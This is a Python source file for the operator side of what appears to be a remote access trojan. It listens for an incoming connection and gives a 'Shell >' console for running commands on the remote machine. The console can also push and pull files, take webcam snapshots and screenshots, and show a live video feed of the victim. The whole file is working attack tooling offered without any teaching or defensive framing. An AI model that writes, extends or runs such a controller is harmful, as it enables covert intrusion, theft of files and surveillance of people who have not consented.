import socket
import struct
import os
import threading
import time
import cv2
import numpy as np
import sys

HOST = '0.0.0.0'
PORT = 65432

def send_data(sock, data: bytes):
    length = struct.pack('>I', len(data))
    sock.sendall(length + data)

def receive_data(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(sock, length)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def save_image(data_bytes, prefix="image"):
    timestamp = int(time.time())
    filename = f"{prefix}_{timestamp}.jpg"
    with open(filename, 'wb') as f:
        f.write(data_bytes)
    print(f"[+] {prefix.capitalize()} saved as {filename}")

def save_snapshot(data_bytes):
    save_image(data_bytes, prefix="snapshot")

def save_screenshot(data_bytes):
    save_image(data_bytes, prefix="screenshot")

def handle_stream(sock):
    print("[*] Starting video stream. Press 'q' in the window or type 'stopstream' in console to stop.")

    try:
        while True:
            frame_bytes = receive_data(sock)
            if frame_bytes is None:
                print("[!] Stream ended or connection lost.")
                break

            # Decode JPEG bytes to image
            np_arr = np.frombuffer(frame_bytes, np.uint8)
            frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
            if frame is None:
                print("[!] Received invalid frame.")
                break

            cv2.imshow("Live Stream", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("[*] Stream stopped by user pressing 'q'.")
                send_data(sock, b"stopstream")  # Tell client to stop streaming
                break
    except Exception as e:
        print(f"[!] Stream error: {e}")
    finally:
        cv2.destroyAllWindows()

def stream_controller(sock):
    """Thread to listen for 'stopstream' command from keyboard input."""
    while True:
        user_cmd = input().strip()
        if user_cmd.lower() == "stopstream":
            send_data(sock, b"stopstream")
            break

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[+] Listening on {HOST}:{PORT}...")

        client_socket, client_address = server_socket.accept()
        print(f"[+] Connected by {client_address}")

        with client_socket:
            while True:
                command = input("Shell > ").strip()
                if not command:
                    continue

                send_data(client_socket, command.encode('utf-8'))

                if command.lower() == 'exit':
                    print("[*] Exiting session.")
                    break

                elif command.lower().startswith('upload '):
                    filename = command.split(maxsplit=1)[1]
                    if not os.path.isfile(filename):
                        print(f"[-] File not found: {filename}")
                        continue
                    with open(filename, 'rb') as f:
                        file_bytes = f.read()
                    print(f"[+] Sending file '{filename}' ({len(file_bytes)} bytes) to client...")
                    send_data(client_socket, file_bytes)

                    response = receive_data(client_socket)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                    else:
                        print("[!] No confirmation received.")

                elif command.lower().startswith('download '):
                    filename = command.split(maxsplit=1)[1]
                    print(f"[+] Waiting to receive file '{filename}' from client...")
                    file_bytes = receive_data(client_socket)
                    if file_bytes is None:
                        print("[-] Failed to receive file or connection closed.")
                        break
                    save_name = f"received_{os.path.basename(filename)}"
                    with open(save_name, 'wb') as f:
                        f.write(file_bytes)
                    print(f"[+] File received and saved as '{save_name}'")

                elif command.lower() == 'snapshot':
                    print("[+] Waiting for snapshot from client...")
                    data = receive_data(client_socket)
                    if data:
                        save_snapshot(data)
                    else:
                        print("[-] Failed to receive snapshot or connection closed.")

                elif command.lower() == 'screenshot':
                    print("[+] Waiting for screenshot from client...")
                    data = receive_data(client_socket)
                    if data:
                        save_screenshot(data)
                    else:
                        print("[-] Failed to receive screenshot or connection closed.")

                elif command.lower() == 'stream':
                    # Start streaming controller thread (to listen for stopstream input)
                    ctrl_thread = threading.Thread(target=stream_controller, args=(client_socket,), daemon=True)
                    ctrl_thread.start()

                    # Show stream frames
                    handle_stream(client_socket)
                    print("[*] Video streaming stopped.")

                else:
                    response = receive_data(client_socket)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                    else:
                        print("[!] No response received or connection closed.")

if __name__ == "__main__":
    start_server()
